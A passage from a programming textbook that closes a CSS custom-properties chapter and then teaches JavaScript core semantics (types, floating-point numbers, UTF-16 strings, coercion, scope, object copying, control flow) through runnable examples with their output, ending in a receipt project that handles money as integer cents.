    gap: var(--space-1);
    transition: translate var(--duration) ease-out, box-shadow var(--duration);
    &:hover { translate: 0 -2px; box-shadow: 0 4px 12px oklch(0% 0 0 / 0.2); }
    & .title { margin: 0; font-size: clamp(1rem, 4cqi, 1.5rem); }
    & .action {
      justify-self: start;
      background: var(--color-accent); color: white;
      border: 0; border-radius: var(--radius); padding: var(--space-1) var(--space-2);
    }
  }
  @container card (min-width: 30rem) {
    .card { grid-template-columns: 1fr auto; align-items: center; }
  }
}
```

```html
<!-- file: project/demo.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Themable card</title>
  <link rel="stylesheet" href="tokens.css">
  <link rel="stylesheet" href="card.css">
  <style> .layout { display: grid; grid-template-columns: 15rem 1fr; gap: 1rem; width: 60rem; } </style>
</head>
<body>
  <div class="layout">
    <div class="card-slot" id="narrow"><article class="card"><h2 class="title">Narrow</h2><button class="action">Open</button></article></div>
    <div class="card-slot" id="wide"><article class="card"><h2 class="title">Wide</h2><button class="action">Open</button></article></div>
  </div>
  <div data-theme="green" class="card-slot" id="green"><article class="card"><h2 class="title">Green</h2><button class="action">Open</button></article></div>
  <script>
    const report = (id) => {
      const card = document.querySelector(`#${id} .card`), cs = getComputedStyle(card);
      return `${id}: columns "${cs.gridTemplateColumns}", title ${getComputedStyle(card.querySelector(".title")).fontSize}, ` +
             `button ${getComputedStyle(card.querySelector(".action")).backgroundColor}, surface ${cs.backgroundColor}, ` +
             `transition ${cs.transitionDuration}`;
    };
    console.log(`dark: ${matchMedia("(prefers-color-scheme: dark)").matches}, reduced motion: ${matchMedia("(prefers-reduced-motion: reduce)").matches}`);
    for (const id of ["narrow", "wide", "green"]) console.log("  " + report(id));
  </script>
</body>
</html>
```

```console
$ cd project && python3 ../../tools/page.py demo.html --width 1000
dark: false, reduced motion: false
  narrow: columns "208px", title 16px, button oklch(0.55 0.18 260), surface oklch(0.96 0.01 260), transition 0.2s, 0.2s
  wide: columns "599.391px 64.6094px", title 24px, button oklch(0.55 0.18 260), surface oklch(0.96 0.01 260), transition 0.2s, 0.2s
  green: columns "879.391px 64.6094px", title 24px, button oklch(0.55 0.18 150), surface oklch(0.96 0.01 150), transition 0.2s, 0.2s
$ cd project && python3 ../../tools/page.py demo.html --width 1000 --media dark --media reduce
dark: true, reduced motion: true
  narrow: columns "208px", title 16px, button oklch(0.55 0.18 260), surface oklch(0.24 0.02 260), transition 0s, 0s
  wide: columns "599.391px 64.6094px", title 24px, button oklch(0.55 0.18 260), surface oklch(0.24 0.02 260), transition 0s, 0s
  green: columns "879.391px 64.6094px", title 24px, button oklch(0.55 0.18 150), surface oklch(0.24 0.02 150), transition 0s, 0s
```

The narrow card stacks and the wide ones put the button beside the title; the green card has hue 150 throughout; dark mode switches every surface; reduced motion sets every transition to 0 s.

The first version of `tokens.css` did not work, and the reason is the most important fact in this chapter. It declared the derived colours on `:root` only:

```console
$ cd project && sed 's/  :root, \[data-theme\] {  /  :root {               /' tokens.css > tokens-broken.css && sed 's/tokens.css/tokens-broken.css/' demo.html > broken.html && python3 ../../tools/page.py broken.html --width 1000
dark: false, reduced motion: false
  narrow: columns "208px", title 16px, button oklch(0.55 0.18 260), surface oklch(0.96 0.01 260), transition 0.2s, 0.2s
  wide: columns "599.391px 64.6094px", title 24px, button oklch(0.55 0.18 260), surface oklch(0.96 0.01 260), transition 0.2s, 0.2s
  green: columns "879.391px 64.6094px", title 24px, button oklch(0.55 0.18 260), surface oklch(0.96 0.01 260), transition 0.2s, 0.2s
```

The green card's button is still hue 260. And the second version — which moved *every* token into the `:root, [data-theme]` rule — had a subtler bug: the green card ignored reduced motion, because that rule re-declared `--duration: 200ms` on the themed element, overriding the 0 ms it would have inherited from the root.

### Deep & Tricky

**DT-18. Custom properties inherit their *computed* value, and `var()` references inside them are substituted where they are declared: `--accent: oklch(55% 0.18 var(--hue))` on `:root` is computed once, with the root's hue, and descendants inherit the finished colour — changing `--hue` further down changes nothing unless `--accent` is declared again on that element. Derived tokens must be declared on every element where their inputs can change (here `:root, [data-theme]`), and only those tokens — re-declaring independent tokens there would shadow overrides from above.** *(CSS Custom Properties Level 1, §2.2 "Resolving Dependency Cycles" and §3 "Using Cascading Variables": substitution happens at computed-value time "on the element"; inherited values are computed values)*

### Review checklist

- Add a `data-theme="contrast"` theme with higher chroma and darker text. Which tokens must change?
- Check contrast: is white text on `oklch(55% 0.18 150)` at least 4.5:1 (WCAG AA)?
- What happens to the card if its slot is a flex item with `flex: none`? (DT-16.)

## Answers to the Chapter 4 prediction questions

**Unit 4.1, Q1.** The substituted value `100px + 20px` is not valid for `width` (arithmetic needs `calc()`), so the declaration is invalid at computed-value time and `width` takes its initial value, `auto`.

**Unit 4.3, Q1.** `.card { &:has(img) { border: 2px solid red; } }`.

**Unit 4.4, Q1.** If an element could change its own layout according to its own width, the change could alter the width again, creating a cycle (an infinite loop of layouts); querying an ancestor whose size does not depend on its contents avoids it.

**Unit 4.5, Q1.** Layout properties change the geometry of the page, forcing layout and repaint of affected boxes on every frame; `transform` and `opacity` can be applied by the compositor to an already painted layer, often on the GPU, without layout or paint.

# Chapter 5 — JavaScript: The Core Language

*Goal: know exactly what JavaScript's values are and how they behave. This chapter covers the eight types, the IEEE 754 numbers behind every `number`, strings as UTF-16 code units, the coercions performed by `==`, `+`, and `if`, the scoping rules of `let`, `const`, and `var` (including the strange global scope of classic browser scripts), objects and arrays as references, and the control-flow statements with their corner cases. The project handles money and text the way production code must: integer cents, exact rounding, locale-aware formatting, and grapheme-safe truncation.*

**What you will be able to do after this chapter**

- Name the eight types and test for them reliably.
- Predict floating-point results, and choose integers, `BigInt`, or `Intl` when exactness matters.
- Measure and slice strings by code units, code points, or graphemes as appropriate.
- Predict the result of `==`, `+`, and truthiness checks, and avoid needing to.
- Explain block scope, the temporal dead zone, and why some global names are already taken.
- Copy objects correctly, and use `for…of`, `switch`, and `try…finally` without surprises.

All programs in this chapter run in Node.js (`node file.mjs`); the language is the same in browsers.

## Topic 5A — Values

## Unit 5.1 — The eight types

**One-line summary:** JavaScript has seven primitive types — `number`, `bigint`, `string`, `boolean`, `undefined`, `null`, `symbol` — and one type for everything else, `object` (which includes arrays, functions, dates, and regular expressions); `typeof` tells them apart except for two historical quirks: `typeof null` is `"object"` and functions report `"function"`.

```js
// file: values/types.mjs
// The eight types of JavaScript values, and what typeof says about each.
import { inspect } from "node:util";
const samples = [42, 3.14, NaN, 10n, "text", true, undefined, null, Symbol("id"),
                 {}, [], function f() {}, new Date(0), /re/];
for (const v of samples) {
  const shown = inspect(v);
  console.log(`${shown.padEnd(26)} typeof ${typeof v}`.padEnd(46) +
              `Array.isArray ${Array.isArray(v)}  Object.prototype.toString ${Object.prototype.toString.call(v)}`);
}
```

```console
$ cd values && node types.mjs
42                         typeof number      Array.isArray false  Object.prototype.toString [object Number]
3.14                       typeof number      Array.isArray false  Object.prototype.toString [object Number]
NaN                        typeof number      Array.isArray false  Object.prototype.toString [object Number]
10n                        typeof bigint      Array.isArray false  Object.prototype.toString [object BigInt]
'text'                     typeof string      Array.isArray false  Object.prototype.toString [object String]
true                       typeof boolean     Array.isArray false  Object.prototype.toString [object Boolean]
undefined                  typeof undefined   Array.isArray false  Object.prototype.toString [object Undefined]
null                       typeof object      Array.isArray false  Object.prototype.toString [object Null]
Symbol(id)                 typeof symbol      Array.isArray false  Object.prototype.toString [object Symbol]
{}                         typeof object      Array.isArray false  Object.prototype.toString [object Object]
[]                         typeof object      Array.isArray true  Object.prototype.toString [object Array]
[Function: f]              typeof function    Array.isArray false  Object.prototype.toString [object Function]
1970-01-01T00:00:00.000Z   typeof object      Array.isArray false  Object.prototype.toString [object Date]
/re/                       typeof object      Array.isArray false  Object.prototype.toString [object RegExp]
```

Primitives are immutable values compared by value; objects are mutable and compared by identity (Unit 5.6). To test for an array use `Array.isArray`; for `null` use `=== null`; for "an object, not null" use `typeof v === "object" && v !== null`. `Object.prototype.toString` reveals the built-in kind of any value, and is what many libraries use for robust type checks.

### Mastery check

1. **Predict.** `typeof typeof 1`?

## Unit 5.2 — Numbers

**One-line summary:** Every `number` is a 64-bit IEEE 754 double: integers are exact only up to 2⁵³ − 1 (`Number.MAX_SAFE_INTEGER`), decimal fractions such as 0.1 cannot be represented exactly, division never throws (it gives `Infinity` or `NaN`), `NaN` is not equal to itself, and `-0` exists; `BigInt` provides exact integers of any size.

```js
// file: values/numbers.mjs
// Every number is an IEEE 754 double: exact integers up to 2^53, binary fractions, NaN, and -0.
console.log(0.1 + 0.2, 0.1 + 0.2 === 0.3, Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON);
console.log(Number.MAX_SAFE_INTEGER, 2 ** 53 + 1, 2 ** 53 + 1 === 2 ** 53);
console.log(9007199254740993n + 1n, typeof (2n ** 64n), 2n ** 64n);
console.log(7 / 2, Math.trunc(7 / 2), Math.floor(-7 / 2), -7 % 3, 1 / 0, -1 / 0, 0 / 0);
console.log(NaN === NaN, Number.isNaN(NaN), isNaN("hello"), Number.isNaN("hello"), Object.is(NaN, NaN));
console.log(-0 === 0, Object.is(-0, 0), 1 / -0, String(-0), JSON.stringify(-0));
console.log((1.005).toFixed(2), (1.005).toPrecision(20), Math.round(-2.5), Math.round(2.5));
console.log(parseInt("08"), parseInt("0x1f"), parseInt("12px"), Number("12px"), Number(""), Number(" 42 "), +[], +{});
console.log(0.1 * 3, 0.1 * 3 === 0.3, (0.1 * 10 * 3) / 10 === 0.3);
```

```console
$ cd values && node numbers.mjs
0.30000000000000004 false true
9007199254740991 9007199254740992 true
9007199254740994n bigint 18446744073709551616n
3.5 3 -4 -1 Infinity -Infinity NaN
false true true false true
true false -Infinity 0 0
1.00 1.0049999999999998934 -2 3
8 31 12 NaN 0 42 0 NaN
0.30000000000000004 false true
```

Line by line: 0.1 + 0.2 is the double closest to 0.30000000000000004, so equality fails — compare with a tolerance, or avoid fractions altogether. 2⁵³ + 1 cannot be represented and rounds to 2⁵³. BigInt arithmetic is exact (`n` suffix). `-7 % 3` is −1: `%` is a remainder with the sign of the dividend, not a modulo. `isNaN("hello")` is `true` because it converts first; `Number.isNaN` does not. `(1.005).toFixed(2)` gives `1.00` because 1.005 is really 1.00499999999999989… . `Math.round` rounds halves towards +∞ (−2.5 → −2). `parseInt` reads a prefix (`"12px"` → 12) while `Number` requires the whole string, and `Number("")` is 0.

### Deep & Tricky

**DT-19. Rounding and formatting functions work on the binary value, not on the decimal you typed: `(1.005).toFixed(2)` is `"1.00"` and `Math.round(1.005 * 100) / 100` is 1 — because 1.005 is stored as 1.00499999999999989… — while `(1.0049999999999999).toFixed(2)` prints the same digits you would expect for 1.005. Money and other decimal quantities must be stored as integers of the smallest unit (cents), or handled by a decimal library, and rounded with integer arithmetic.** *(ECMA-262 §21.1.3.3 `Number.prototype.toFixed`: "let n be an integer for which n / 10^f − x is as close to zero as possible"; IEEE 754-2019 §5.12)*

### Mastery check

1. **Predict.** `0.1 * 3 === 0.3`? `(0.1 * 10 * 3) / 10 === 0.3`? (The program's last line answers it — explain why.)

## Unit 5.3 — Strings

**One-line summary:** A string is an immutable sequence of UTF-16 *code units*: characters outside the Basic Multilingual Plane (most emoji) take two units, so `length`, indexing, and `slice` count units, not characters; iterating with `for…of` or spreading yields code points; and what users see as one character (a *grapheme*: a flag, an emoji with a skin tone, a letter with a combining accent) can be many code points, counted with `Intl.Segmenter`.

```js
// file: values/strings.mjs
// Strings are sequences of UTF-16 code units; "characters" are something else entirely.
const s = "naïve café 👍🏽 🇫🇷";
console.log(`length ${s.length}, code points ${[...s].length}, ` +
            `graphemes ${[...new Intl.Segmenter("en", { granularity: "grapheme" }).segment(s)].length}`);
console.log("👍".length, "👍".charCodeAt(0).toString(16), "👍".codePointAt(0).toString(16), "👍"[0] === "\ud83d");
console.log("é" === "é", "é".length, "é".normalize("NFC") === "é");
console.log("abc".slice(-2), "abc".at(-1), "a-b-c".split("-"), "  x ".trim() + "|", "x".padStart(3, "."));
console.log(`template: ${1 + 1} ${["a", "b"]} ${{}} ${null}`);
console.log("a" < "b", "B" < "a", "10" < "9", ["b", "a", "C"].sort(), ["b", "a", "C"].sort((x, y) => x.localeCompare(y)));
console.log("Straße".toUpperCase(), "İ".toLowerCase().length, "ﬀ".toUpperCase());
```

```console
$ cd values && node strings.mjs
length 20, code points 16, graphemes 14
2 d83d 1f44d true
false 2 true
bc c [ 'a', 'b', 'c' ] x| ..x
template: 2 a,b [object Object] null
true true true [ 'C', 'a', 'b' ] [ 'a', 'b', 'C' ]
STRASSE 2 FF
```

The sample has 20 code units, 16 code points, and 14 graphemes: the thumbs-up with a skin-tone modifier is 2 code points (4 units), and the flag is 2 regional-indicator code points. `"👍"[0]` is half of a surrogate pair — a lone surrogate that is not a valid character. `"é"` (e + combining acute) looks like "é" but is a different string until normalised. Default comparisons are by code unit (`"B" < "a"`, `"10" < "9"`), so the default `sort` is wrong for both people's names and numbers; `localeCompare` (or `Intl.Collator`) sorts as a human would. Case mapping can change the length (`"Straße"` → `"STRASSE"`).

### Mastery check

1. **Predict.** `"🇫🇷".length` and `[..."🇫🇷"].length`.

## Unit 5.4 — Equality and coercion

**One-line summary:** `===` compares without converting types (except that `NaN !== NaN` and `+0 === -0`), `==` applies a conversion table that makes `0 == ""` and `[1] == 1` true, `+` concatenates as soon as either operand is a string, truthiness has exactly eight falsy values, and `??` (nullish coalescing) treats only `null` and `undefined` as missing — unlike `||`, which also replaces `0` and `""`.

```js
// file: values/equality.mjs
// == converts types before comparing; === never does. Truthiness has exactly eight falsy values.
import { inspect } from "node:util";
const pairs = [[0, ""], [0, "0"], ["", "0"], [null, undefined], [null, 0], [NaN, NaN],
               [[], ""], [[1], 1], [[1, 2], "1,2"], [{}, "[object Object]"], [true, 1], ["1", true]];
for (const [a, b] of pairs)
  console.log(`${inspect(a)} == ${inspect(b)}`.padEnd(26) +
              `${String(a == b).padEnd(6)} ===  ${a === b}`);
const falsy = [false, 0, -0, 0n, "", null, undefined, NaN];
console.log("falsy:", falsy.map((v) => Boolean(v)).every((x) => !x),
            "| truthy:", ["0", "false", [], {}, () => {}, -1, Infinity].every(Boolean));
console.log(1 + "2", "3" * "4", 1 + 2 + "3", "1" + 2 + 3, [] + [], [] + {}, true + true, "5" - 2);
console.log([10, 9, 1, 100].sort(), [10, 9, 1, 100].sort((a, b) => a - b));
console.log(null ?? "default", 0 ?? "default", 0 || "default", "" || "fallback", undefined?.x, null?.[0]);
```

```console
$ cd values && node equality.mjs
0 == ''                   true   ===  false
0 == '0'                  true   ===  false
'' == '0'                 false  ===  false
null == undefined         true   ===  false
null == 0                 false  ===  false
NaN == NaN                false  ===  false
[] == ''                  true   ===  false
[ 1 ] == 1                true   ===  false
[ 1, 2 ] == '1,2'         true   ===  false
{} == '[object Object]'   true   ===  false
true == 1                 true   ===  false
'1' == true               true   ===  false
falsy: true | truthy: true
12 12 33 123  [object Object] 2 3
[ 1, 10, 100, 9 ] [ 1, 9, 10, 100 ]
default 0 default fallback undefined undefined
```

Every `==` pair above is `true` except two, and every `===` pair is `false`: `==` is not transitive (`0 == ""` and `0 == "0"`, but `"" != "0"`). Objects are converted to primitives (an array to its joined string, `{}` to `"[object Object]"`) before comparing. In `1 + 2 + "3"`, the additions run left to right: 3, then `"33"`. The default `sort` converts numbers to strings, putting 100 before 9. Use `===` always, `== null` at most as a deliberate check for "null or undefined", and `??` for defaults when `0` or `""` are legitimate values.

### Mastery check

1. **Predict.** `[] == ![]`.

## Topic 5B — Names

## Unit 5.5 — Scope: `let`, `const`, `var`, and the global object

**One-line summary:** `let` and `const` are scoped to the enclosing block and cannot be used before their declaration (the *temporal dead zone*); `var` is scoped to the whole function and hoisted with the value `undefined`; `const` prevents reassignment of the binding, not changes to the object; and in browsers, classic scripts share one global scope that is already full of names.

```js
// file: scope/scope.mjs
// let and const are block-scoped and in a "temporal dead zone" until declared; var is function-scoped.
{
  var v = "var leaks out of the block";
  let l = "let stays inside";
}
console.log(v, "|", typeof l);

try { console.log(early); let early = 1; } catch (e) { console.log(`${e.name}: ${e.message}`); }
console.log(hoisted); var hoisted = "assigned later";       // declared at the top, undefined until here

const fns = [];
for (var i = 0; i < 3; i++) fns.push(() => i);             // one variable shared by every closure
const lets = [];
for (let j = 0; j < 3; j++) lets.push(() => j);            // a fresh binding per iteration
console.log("var loop:", fns.map((f) => f()), " let loop:", lets.map((f) => f()));

const config = { debug: false };
config.debug = true;                                       // const freezes the binding, not the object
try { config = {}; } catch (e) { console.log(`${e.name}: ${e.message}`); }
console.log(config, Object.isFrozen(Object.freeze(config)));
```

```console
$ cd scope && node scope.mjs
var leaks out of the block | undefined
ReferenceError: Cannot access 'early' before initialization
undefined
var loop: [ 3, 3, 3 ]  let loop: [ 0, 1, 2 ]
TypeError: Assignment to constant variable.
{ debug: true } true
```

The loop result is the classic closure trap: all three functions created in the `var` loop see the same `i`, which is 3 after the loop; `let` creates a new binding for each iteration. In the browser, the top level of classic scripts has its own surprises:

```html
<!-- file: scope/global.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>The global scope of classic scripts</title></head>
<body>
  <div id="message">hello</div>
  <div id="status">ready</div>
  <script>
    var counter = 1;                           // var at top level becomes a property of window
    let secret = 2;                            // let/const live in a separate global scope
    console.log(`window.counter ${window.counter}, window.secret ${window.secret}`);
    console.log(`an element with an id becomes a global: message.textContent = ${message.textContent}`);
    console.log(`... unless window already has that name: status.textContent = ${status.textContent}`);
    console.log(`name is already a window property: typeof name = ${typeof name}, value "${name}"`);
  </script>
  <script>
    console.log(`the second script sees counter ${counter} and secret ${secret}`);
    try { eval("let secret = 3"); console.log("eval created its own scope"); } catch (e) { console.log(e.message); }
  </script>
  <script>
    const top = 0;                             // window.top already exists and cannot be redefined
  </script>
  <script type="module">
    const top = 0;                             // modules have their own top-level scope
    console.log(`in a module, top = ${top}; window.top is still the window: ${window.top === window}`);
  </script>
</body>
</html>
```

```console
$ cd scope && python3 ../../tools/page.py global.html
window.counter 1, window.secret undefined
an element with an id becomes a global: message.textContent = hello
... unless window already has that name: status.textContent = undefined
name is already a window property: typeof name = string, value ""
the second script sees counter 1 and secret 2
eval created its own scope
Uncaught SyntaxError: Identifier 'top' has already been declared
in a module, top = 0; window.top is still the window: true
```

### Deep & Tricky

**DT-20. In a browser, every classic script's top-level `var` and function declarations become properties of `window`, and `let`/`const` declarations go into a global lexical scope shared by all classic scripts — and both collide with the hundreds of properties `window` already has. `const top = 0` throws "Identifier 'top' has already been declared" because `window.top` is an unconfigurable property; `var name = 5` silently converts 5 to the string `"5"` (`window.name` is a string property that survives navigation); and elements with an `id` become global variables (`message.textContent`) *unless* `window` already has a property of that name, so `status` refers to the old `window.status` string, not the element.** *(HTML Living Standard §7.2.2.3 "Named access on the Window object" and the `[LegacyUnforgeable]` `top` attribute; ECMA-262 §16.1.7 GlobalDeclarationInstantiation, which throws a SyntaxError for a lexical declaration that conflicts with a non-configurable global property)* Module scripts (`type="module"`) have their own top-level scope, and avoid all of this.

### Mastery check

1. **Predict.** What does `console.log(typeof x); let x = 1;` print? And `console.log(typeof y);` when `y` is never declared?

## Unit 5.6 — Objects, arrays, and copying

**One-line summary:** Variables hold references to objects, so assignment shares; spread (`{...o}`, `[...a]`) and `Object.assign` copy one level only; `structuredClone` makes a deep copy that preserves dates, maps, sets, and cycles; and `JSON` round-trips lose everything that is not plain JSON — dates become strings, `undefined` fields disappear.

```js
// file: data/copy.mjs
// Objects and arrays are references. Copies made with spread are shallow.
const order = { id: 7, items: [{ sku: "A", qty: 1 }], placed: new Date(0), note: undefined };
const alias = order;
const shallow = { ...order };
const deep = structuredClone(order);
const viaJson = JSON.parse(JSON.stringify(order));

order.id = 8;
order.items[0].qty = 99;
console.log("alias.id", alias.id, "| shallow.id", shallow.id, "| shallow qty", shallow.items[0].qty,
            "| deep qty", deep.items[0].qty);
console.log("structuredClone keeps a Date:", deep.placed instanceof Date,
            "| JSON turns it into", typeof viaJson.placed, "and drops", "note" in viaJson ? "nothing" : "the undefined field");

const { id, items: [first], missing = "default" } = order;    // destructuring with a default
console.log(id, first.sku, missing);
const merged = { ...{ a: 1, b: 2 }, ...{ b: 3 } };             // later spread wins
console.log(merged, [..."hey"], Object.entries({ x: 1, y: 2 }), Object.fromEntries([["k", "v"]]));
const arr = [3, 1, 2];
const sorted = arr.toSorted();                                 // ES2023: copies instead of mutating
console.log(arr, sorted, arr.with(0, 30), arr.at(-1), arr.includes(NaN), [NaN].includes(NaN), [NaN].indexOf(NaN));
```

```console
$ cd data && node copy.mjs
alias.id 8 | shallow.id 7 | shallow qty 99 | deep qty 1
structuredClone keeps a Date: true | JSON turns it into string and drops the undefined field
8 A default
{ a: 1, b: 3 } [ 'h', 'e', 'y' ] [ [ 'x', 1 ], [ 'y', 2 ] ] { k: 'v' }
[ 3, 1, 2 ] [ 1, 2, 3 ] [ 30, 1, 2 ] 2 false true -1
```

Changing `order.items[0].qty` also changed `shallow.items[0].qty` — the shallow copy shares the inner array — but not the deep clone. Destructuring pulls values out by name or position, with defaults. Recent array methods (`toSorted`, `toReversed`, `toSpliced`, `with`) return copies instead of mutating, which makes code that shares arrays much safer. `includes` finds `NaN`; `indexOf` (which uses `===`) cannot.

### Mastery check

1. **Predict.** `structuredClone({ f() {} })`?

## Unit 5.7 — Control flow and its corner cases

**One-line summary:** `for…of` iterates values from an iterator (arrays, strings, maps, sets); `for…in` iterates enumerable property *keys* as strings, including inherited ones, and does not belong on arrays; `switch` compares with `===`; and a `finally` block always runs — and if it returns, it replaces the result or exception of the `try`.

```js
// file: data/flow.mjs
// Loops over values and keys, and the surprises of switch and finally.
const list = ["a", "b"];
list.extra = "property";
for (const x of list) console.log("for...of", x);           // values from the iterator
for (const k in list) console.log("for...in", k);           // enumerable keys, as strings, own and inherited

function grade(score) {
  switch (true) {                                           // switch compares with ===
    case score >= 90: return "A";
    case score >= 80: return "B";
    default: return "C";
  }
}
console.log(grade(95), grade(85), grade("95"), grade(70));

function cleanup() {
  try { return "from try"; }
  finally { console.log("finally runs before the function returns"); }
}
console.log(cleanup());
function swallow() {
  try { throw new Error("lost"); }
  finally { return "finally's return replaces the exception"; }   // almost always a bug
}
console.log(swallow());
outer: for (let i = 0; i < 3; i++)
  for (let j = 0; j < 3; j++) { if (j === 1) continue outer; if (i === 2) break outer; console.log(`i=${i} j=${j}`); }
```

```console
$ cd data && node flow.mjs
for...of a
for...of b
for...in 0
for...in 1
for...in extra
A B A C
finally runs before the function returns
from try
finally's return replaces the exception
i=0 j=0
i=1 j=0
```

`for…in` found the extra property on the array (and the indices as strings). `switch (true)` with conditions in the `case` labels is a common idiom, but note `grade("95")`: the comparison `"95" >= 90` converts the string, so it "works" by accident. The function whose `finally` returns swallows the exception entirely — a bug that hides errors. Labels let `break` and `continue` target an outer loop.

## Chapter 5 Project — Money and text that do not lie

### Requirements

Write two small modules for a point-of-sale receipt:

- **money:** parse decimal strings into integer cents (rejecting anything that is not a plain amount with at most two decimals, and anything beyond the safe-integer range); apply a percentage rate with exact round-half-away-from-zero rounding; split an amount into n parts that differ by at most one cent and sum exactly; format with `Intl.NumberFormat` for any currency and locale.
- **text:** truncate strings to a number of graphemes with an ellipsis, and lay out "name … price" lines of a fixed width.

Print a receipt, show what floating-point arithmetic would have produced, and test the edge cases with `node:assert`.

### Reference solution

```js
// file: project/money.mjs
// Money as integer minor units (cents), never as floating-point dollars.

/** Parse "12.34", "12.3", "12" or "-0.5" into cents; reject anything else. */
export function parseCents(text) {
  const m = /^(-)?(\d+)(?:\.(\d{1,2}))?$/.exec(text.trim());
  if (!m) throw new RangeError(`not an amount: ${JSON.stringify(text)}`);
  const cents = Number(m[2]) * 100 + Number((m[3] ?? "").padEnd(2, "0"));
  if (!Number.isSafeInteger(cents)) throw new RangeError(`amount too large: ${text}`);
  return m[1] ? -cents : cents;
}

/** Multiply cents by a rate (e.g. 0.0825 tax) and round half away from zero, on exact integers. */
export function applyRate(cents, rate, scale = 10_000) {
  const r = Math.round(rate * scale);                        // the rate itself in 1/10,000ths
  const product = BigInt(cents) * BigInt(r);                 // exact, however large
  const s = BigInt(scale);
  const q = product / s, rem = product % s;                  // BigInt division truncates toward zero
  const roundAway = (rem < 0n ? -rem : rem) * 2n >= s;
  return Number(roundAway ? q + (product < 0n ? -1n : 1n) : q);
}

/** Split cents into n parts that differ by at most one cent and add up exactly. */
export function split(cents, n) {
  const base = Math.trunc(cents / n), extra = cents - base * n;
  return Array.from({ length: n }, (_, i) => base + (i < extra ? 1 : 0));
}

export function format(cents, currency = "USD", locale = "en-US") {
  return new Intl.NumberFormat(locale, { style: "currency", currency }).format(cents / 100);
}
```

```js
// file: project/text.mjs
// Fixed-width text for a receipt printer, without cutting characters in half.
const segmenter = new Intl.Segmenter("en", { granularity: "grapheme" });

export function graphemes(s) {
  return [...segmenter.segment(s.normalize("NFC"))].map((g) => g.segment);
}

/** Truncate to at most `width` user-perceived characters, ending with "…" if shortened. */
export function truncate(s, width) {
  const g = graphemes(s);
  return g.length <= width ? g.join("") : g.slice(0, width - 1).join("") + "…";
}

export function line(left, right, width) {
  const r = graphemes(right).length;
  const l = truncate(left, width - r - 1);
  return l + " ".repeat(width - graphemes(l).length - r) + right;
}
```

```js
// file: project/receipt.mjs
import { parseCents, applyRate, split, format } from "./money.mjs";
import { line } from "./text.mjs";

const items = [["Café latte ☕", "4.10"], ["Croissant", "2.95"], ["Jalapeño bagel with cream cheese", "3.40"],
               ["Ice water 🧊", "0.00"], ["Gift card top-up", "0.10"], ["Gift card top-up", "0.20"]];
const WIDTH = 32;

const naive = items.reduce((sum, [, p]) => sum + Number(p), 0);
console.log(`floating-point total: ${naive}  (${naive === 10.75 ? "exact" : "not exact"})\n`);

const cents = items.map(([, p]) => parseCents(p));
const subtotal = cents.reduce((a, b) => a + b, 0);
const tax = applyRate(subtotal, 0.0825);
for (const [[name], c] of items.map((it, i) => [it, cents[i]])) console.log(line(name, format(c), WIDTH));
console.log("-".repeat(WIDTH));
console.log(line("Subtotal", format(subtotal), WIDTH));
console.log(line("Tax 8.25%", format(tax), WIDTH));
console.log(line("Total", format(subtotal + tax), WIDTH));
console.log(`\nSplit 5 ways: ${split(subtotal + tax, 5).map((c) => format(c)).join(" + ")}`);
console.log(`\nIn Germany: ${format(subtotal + tax, "EUR", "de-DE")}; in India: ${format(123456789, "INR", "en-IN")}`);
```

```js
// file: project/test.mjs
import assert from "node:assert/strict";
import { parseCents, applyRate, split } from "./money.mjs";
import { truncate, graphemes } from "./text.mjs";

assert.equal(parseCents("12.34"), 1234);
assert.equal(parseCents("12.3"), 1230);
assert.equal(parseCents("-0.05"), -5);
assert.throws(() => parseCents("1.234"), RangeError);
assert.throws(() => parseCents("1e3"), RangeError);
assert.throws(() => parseCents("99999999999999999"), RangeError);
assert.equal(applyRate(1075, 0.0825), 89);        // 88.6875 -> 89
assert.equal(applyRate(200, 0.0025), 1);          // exactly half a cent rounds away from zero
assert.equal(applyRate(-200, 0.0025), -1);
assert.deepEqual(split(1000, 3), [334, 333, 333]);
assert.equal(split(1000, 7).reduce((a, b) => a + b), 1000);
assert.equal(truncate("👍🏽👍🏽👍🏽", 2), "👍🏽…");
assert.equal(graphemes("é").length, 1);
assert.equal(truncate("🇫🇷🇩🇪", 5), "🇫🇷🇩🇪");
console.log("all tests passed");
```

```console
$ cd project && node receipt.mjs
floating-point total: 10.749999999999998  (not exact)

Café latte ☕               $4.10
Croissant                  $2.95
Jalapeño bagel with cream… $3.40
Ice water 🧊                $0.00
Gift card top-up           $0.10
Gift card top-up           $0.20
--------------------------------
Subtotal                  $10.75
Tax 8.25%                  $0.89
Total                     $11.64

Split 5 ways: $2.33 + $2.33 + $2.33 + $2.33 + $2.32

In Germany: 11,64 €; in India: ₹12,34,567.89
$ cd project && node test.mjs
all tests passed
```

Adding the prices as floating-point numbers gives 10.749999999999998; in cents the subtotal is exactly 1,075. The tax rate is converted to an integer number of ten-thousandths, and the product is computed with `BigInt` so that even very large amounts round exactly. The split hands out the remainder one cent at a time. `Intl.NumberFormat` knows that Germans write `11,64 €` and that Indian grouping is 12,34,567.89.

Look closely at the receipt, though: the lines with ☕ and 🧊 are one column wider than the others. Each emoji counts as one grapheme but occupies *two* columns on a terminal or a receipt printer.

### Deep & Tricky

**DT-21. There are at least four "lengths" of a string, and each is right for a different job: UTF-16 code units (`.length` — storage and indexes), code points (`[...s].length` — Unicode processing), grapheme clusters (`Intl.Segmenter` — cursor movement, truncation, "characters" as users count them), and display columns (East Asian Width and emoji presentation — fixed-width layout), which no built-in API computes. A database column limit is usually yet another: UTF-8 bytes (`new TextEncoder().encode(s).length`).** *(ECMA-262 §6.1.4 "The String Type"; Unicode Standard Annex #29 "Unicode Text Segmentation"; Unicode Standard Annex #11 "East Asian Width"; ECMA-402 `Intl.Segmenter`)*

### Review checklist

- `parseCents("1,234.50")` throws. Should it? Where does locale-aware parsing belong?
- Rounding half away from zero is one convention; tax rules in some countries require rounding per line rather than on the total. How would you change the API?
- Write a `displayWidth` function using `\p{Extended_Pictographic}` and the East Asian Width ranges, and fix the receipt.

## Answers to the Chapter 5 prediction questions

**Unit 5.1, Q1.** `"string"` — `typeof 1` is the string `"number"`.

**Unit 5.2, Q1.** `false` and `true`: 0.1 × 3 rounds to 0.30000000000000004, while 0.1 × 10 happens to round to exactly 1, and 3 / 10 is the same double as the literal 0.3. This is luck, not a technique.

**Unit 5.3, Q1.** 4 and 2: two regional-indicator code points, each a surrogate pair.

**Unit 5.4, Q1.** `true`: `![]` is `false` (an array is truthy); `[] == false` converts both to numbers: `[]` → `""` → 0, `false` → 0.

